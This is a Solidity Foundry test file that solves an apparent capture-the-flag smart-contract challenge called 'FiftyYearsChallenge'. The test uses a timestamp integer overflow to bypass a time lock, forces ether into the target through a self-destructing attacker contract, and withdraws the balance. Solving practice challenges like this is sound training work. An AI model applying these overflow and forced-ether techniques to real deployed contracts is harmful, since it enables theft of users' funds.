// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
import "forge-std/Test.sol";
import "../../src/math/6.sol";
import "./3.t.sol";

contract FiftyYearsChallengeTest is Test {
    FiftyYearsChallenge target;
    address player;
    function setUp() public {
        player = vm.addr(1);
        vm.deal(player, 100 ether);
        target = new FiftyYearsChallenge{value: 1 ether}(player);
    }

    function testComplete() public {
        vm.startPrank(player);
        target.upsert{value:1}(1, ((type(uint256).max + 1 - 1 days)));
        target.upsert{value: 2}(3, 0);
        RetirementFundAttacker attacker = new RetirementFundAttacker{value: 2 wei}();
        attacker.destroy(payable(address(target)));
        target.withdraw(2);
        emit log_named_uint("balance", address(target).balance);
        assertTrue(target.isComplete());
    }
}